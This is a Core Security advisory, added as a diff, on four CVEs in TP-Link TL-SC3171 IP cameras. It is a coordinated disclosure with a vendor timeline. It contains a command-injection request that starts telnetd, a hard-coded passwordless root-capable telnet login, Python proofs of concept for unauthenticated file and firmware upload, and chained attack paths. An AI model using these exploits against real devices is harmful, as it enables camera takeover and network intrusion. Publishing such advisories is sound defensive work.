@@ -1,0 +1,279 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+Multiple Vulnerabilities in TP-Link TL-SC3171 IP Cameras
+
+
+1. *Advisory Information*
+
+Title: Multiple Vulnerabilities in TP-Link TL-SC3171 IP Cameras
+Advisory ID: CORE-2013-0618
+Advisory URL:
+http://www.coresecurity.com/advisories/multiple-vulnerabilities-tp-link-tl-sc3171-ip-cameras
+Date published: 2013-07-30
+Date of last update: 2013-07-30
+Vendors contacted: TP-Link
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: OS command injection [CWE-78], Use of hard-coded credentials
+[CWE-798], Authentication Bypass Issues [CWE-592], Missing
+Authentication for Critical Function [CWE-306]
+Impact: Code execution, Security bypass
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2013-2578, CVE-2013-2579, CVE-2013-2580, CVE-2013-2581
+
+
+3. *Vulnerability Description*
+
+Multiple vulnerabilities have been found in TP-Link TL-SC3171 [1] IP
+camera running firmware version LM.1.6.18P12_sign5 that could allow an
+attacker:
+
+   1. [CVE-2013-2578] to execute arbitrary commands through the file
+'/cgi-bin/admin/servetest'.
+   2. [CVE-2013-2579] to execute arbitrary commands in a shell using
+hard-coded credentials.
+   3. [CVE-2013-2580] to perform unauthenticated remote file uploads.
+   5. [CVE-2013-2581] to perform unauthenticated remote firmware upgrades.
+
+3.1. *Attack Paths*
+
+There are several attack paths that can be exploited by combining these
+vulnerabilities with other ones discovered by Eliezer Varade Lopez,
+Javier Repiso Sanchez and Jonas Ropero Castillo [2]. Additional attack
+paths are available, but the ones listed here allow understanding how an
+attacker could compromise the affected device.
+
+3.1.1. *Attack Path I*
+
+(Authentication: none)
+
+   1. Upload a rooted firmware exploiting [CVE-2013-2581].
+   2. Reboot the device by exploiting 'http://<ip-cam>/cgi-bin/reboot'[2].
+
+3.1.2. *Attack Path II*
+
+(Authentication: bypassed)
+
+   1. Reset the device to its factory defaults exploiting
+'http://<ip-cam>/cgi-bin/hardfactorydefault'[2]. After this step, the
+authentication can by bypassed by using 'admin:admin' as a valid
+'username:password'.
+   2. Reboot the device by exploiting 'http://<ip-cam>/cgi-bin/reboot'[2].
+   3. Start the Telnet service exploiting [CVE-2013-2578].
+   4. Login to the Telnet service using user 'qmik' (no password)
+[CVE-2013-2579], and use the device as a pivoting point.
+
+4. *Vulnerable Packages*
+
+Tests and PoC were run on:
+
+   . TP-Link TL-SC3171 IP camera running firmware version
+LM.1.6.18P12_sign5.
+   . Other TP-Link cameras and firmware versions are probably affected
+too, but they were not checked.
+
+5. *Vendor Information, Solutions and Workarounds*
+
+Vendor provides the links to (pre-release) patched firmware versions
+[3]. The final official versions will be released in the next few days.
+Please, contact TP-Link for further information.
+
+6. *Credits*
+
+These vulnerabilities were discovered by Flavio de Cristofaro and
+researched with the help of Andres Blanco from Core Security
+Technologies. The publication of this advisory was coordinated by
+Fernando Miranda from Core Advisories Team.
+
+
+7. *Technical Description / Proof of Concept Code*
+
+7.1. *OS Command Injection in servetest*
+
+[CVE-2013-2578] The file '/cgi-bin/admin/servetest' has an OS command
+injection in several of its parameters that can be exploited by an
+authenticated user to execute arbitrary commands. The following proof of
+concept starts the telnetd service:
+
+/-----
+GET
+/cgi-bin/admin/servetest?cmd=smtp&ServerName=1.1.1.1;/usr/sbin/telnetd;&ServerPort=25&ServerSSL=off&RcptToAddr1=q@q&AdminAddr=q@q
+HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+Referer: http://192.168.1.100/progress.htm
+If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64;
+Trident/5.0)
+Host: 192.168.1.100
+Proxy-Connection: Keep-Alive
+Cookie: VideoFmt=1
+Authorization: Basic YWRtaW46YWRtaW4=
+Content-Length: 2
+-----/
+
+7.2. *Hard-coded credentials in telnet service*
+
+[CVE-2013-2579] The affected system includes a hard-coded login with no
+password which could be used by a remote attacker to access the OS of
+the affected device using the built-in telnet service:
+
+/-----
+username: qmik
+password: (none)      
+-----/
+
+The 'qmik' user is allowed to execute the command 'su', allowing the
+user to execute arbitrary commands with root level privileges. The
+telnet service can be enabled through [CVE-2013-2578].
+
+
+7.3. *Unauthenticated remote file uploads*
+
+[CVE-2013-2580] The file '/cgi-bin/uploadfile' allows an unauthenticated
+user to perform remote file uploads as shown in the following Python PoC:
+
+
+/-----
+import requests
+
+fileName = "lala.tmp"
+f = open(fileName, "w")
+f.write("lala")
+f.close()
+requests.post("http://192.168.1.100/cgi-bin/uploadfile",
+files={fileName: open(fileName, "rb")})
+-----/
+
+The uploaded file (in this example lala.tmp) will be hosted in the
+'/mnt/mtd' directory.
+
+
+7.4. *Unauthenticated remote firmware upgrades*
+
+[CVE-2013-2581] The file '/cgi-bin/firmwareupgrade' allows an
+unauthenticated user to perform remote firmware upgrades as shown in the
+following Python POC:
+
+
+/-----
+import requests
+
+requests.get("http://192.168.1.100/cgi-bin/firmwareupgrade?action=preset")
+fileName = "COM_T01F001_LM.1.6.18P12_sign5_TPL.TL-SC3171.bin"
+cookies={"VideoFmt":"1"}
+requests.post("http://192.168.1.100/cgi-bin/firmwareupgrade?action=preset",
+files={"SetFWFileName" : (fileName, open(fileName, "rb"))}, cookies=cookies)
+-----/
+
+
+8. *Report Timeline*
+
+. 2013-06-12:
+Core Security Technologies notifies the TP-Link team of the vulnerability.
+
+. 2013-06-18:
+Core Security Technologies notifies the TP-Link team of the
+vulnerability and set the estimated publication date of the advisory for
+July 10, 2013.
+
+. 2013-06-19:
+TP-Link answers saying that these vulnerabilities are the same as the
+ones published on May 28, 2013.
+
+. 2013-06-26:
+Core Security Technologies notifies the TP-Link team that these are new,
+different, vulnerabilities and sends a draft report with technical
+information.
+
+. 2013-06-26:
+Vendor acknowledges the receipt of the technical report.
+
+. 2013-07-01:
+Vendor requests additional technical information.
+
+. 2013-07-04:
+Core re-sends an improved technical report with additional information
+regarding possible attack paths [Sec. 3.1].
+
+. 2013-07-10:
+First release date missed.
+
+. 2013-07-15:
+Core asks for a status update.
+
+. 2013-07-22:
+Vendor notifies that a patched firmware version will be released on July
+29th.
+
+. 2013-07-22:
+Core re-schedules the advisory publication for July 29th.
+
+. 2013-07-26:
+Vendor notifies that a (pre-release) patched firmware version is
+available [3] and being tested. The final firmware version will be
+released in the next few days.
+
+. 2013-07-30:
+Advisory CORE-2013-0618 is published.
+
+
+9. *References*
+
+[1] TP-Link TL-SC3171,
+http://www.tp-link.com/en/products/details/?categoryid=230&model=TL-SC3171.
+[2] Security Analysis of IP video surveillance cameras,
+http://seclists.org/fulldisclosure/2013/Jun/84.
+[3] See the online version,
+http://www.coresecurity.com/advisories/multiple-vulnerabilities-tp-link-tl-sc3171-ip-cameras.
+
+
+10. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+11. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2013 Core Security
+Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+13. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
